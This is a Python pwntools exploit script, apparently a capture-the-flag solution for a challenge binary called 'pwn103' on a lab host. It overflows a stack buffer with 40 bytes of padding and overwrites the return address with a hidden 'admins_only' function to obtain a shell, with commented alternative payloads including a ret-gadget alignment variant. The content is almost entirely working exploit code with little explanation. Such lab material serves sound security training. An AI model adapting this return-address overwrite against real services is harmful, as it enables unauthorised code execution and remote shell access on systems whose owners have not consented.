#!/usr/bin/env python3
# this challenge has hidden function which is call admins_only. We need to override ret address with this function to get the /bin/bash shell.We need to increase the address to alignment the stack



from pwn import *

host = "10.10.26.110"
port = 9003

context.log_level = 'warning'

binary = ELF("./pwn103")
#p = process("./pwn103")
p = remote(host,port)

admins_only = binary.symbols["admins_only"] + 1
print(f"[+] Hidden function address @ {hex(admins_only)}")

payload = flat(
    b"A" * 40,
    p64(admins_only)
)

# Method 1, we can just direct put increased address
# payload = flat(
#     asm("nop") * 40,
#     p64(0x0000000000401555)   # admins_only function
# )


# Method 2
# payload = flat(
#     asm("nop") * 40,
#     p64(0x401016),
#     p64(0x0000000000401554)	# admins_only function
# )

p.sendline(b"3")
p.recvline()
p.sendlineafter(b"[pwner]:", payload)
p.recvline()
p.interactive()